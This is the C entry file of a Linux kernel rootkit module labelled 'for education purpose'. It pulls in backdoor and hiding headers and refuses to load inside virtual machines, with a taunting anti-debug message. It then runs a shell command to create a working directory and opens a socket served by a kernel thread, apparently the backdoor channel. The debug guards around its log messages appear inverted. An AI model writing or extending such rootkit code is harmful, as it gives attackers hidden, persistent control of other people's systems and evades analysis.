#include <linux/in.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/module.h>
#include <linux/net.h>
#include <linux/socket.h>

#include "backdoor.h"
#include "config.h"
#include "hide.h"
#include "virtu.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("LeG");
MODULE_DESCRIPTION("Basic linux rootkit - FOR EDUCATION PURPOSE");
MODULE_VERSION("0.01");

static struct socket *sock = NULL;
static struct task_struct *task = NULL;

static int __init rk_init(void)
{
    int err;
    if (is_running_in_vm() == 0)
    {
#ifndef DEBUG
        printk(KERN_ERR "chicken_rk: Error don't try to debug me :)\n");
#endif
        return 1;
    }

    // Create /tmp/rk directory if it doesn't exist
    run_cmd("mkdir /tmp/rk\n");

#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: loading rk...\n");
    printk(KERN_INFO "chicken_rk: creating socket\n");
#endif

    err = create_socket(&sock, &task);
    if (err < 0)
    {
#ifndef DEBUG
        printk(KERN_INFO "chicken_rk: ERROR during socket setup\n");
#endif
        if (sock)
            sock_release(sock);
        if (task)
            kthread_stop(task);
        return err;
    }
    init_config();
#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: config file created\n");
#endif
    return 0;
}

static void __exit rk_exit(void)
{
#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: unloading rk...\n");
    printk(KERN_INFO "chicken_rk: thread stopped\n");
#endif

    // Release the socket
    if (sock)
        sock_release(sock);

#ifndef DEBUG
    printk(KERN_INFO "chicken_rk: socket released\n");
#endif
}

module_init(rk_init);
module_exit(rk_exit);
